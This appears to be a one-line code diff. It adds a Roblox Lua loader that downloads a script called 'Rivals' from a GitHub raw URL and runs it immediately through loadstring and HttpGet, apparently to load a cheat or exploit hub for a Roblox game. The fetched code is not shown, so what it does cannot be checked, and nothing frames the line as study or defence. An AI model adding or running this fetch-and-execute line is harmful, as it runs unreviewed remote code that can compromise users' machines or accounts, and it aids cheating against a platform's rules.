@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SrilangishT/SrilangishHub/refs/heads/main/Rivals"))()
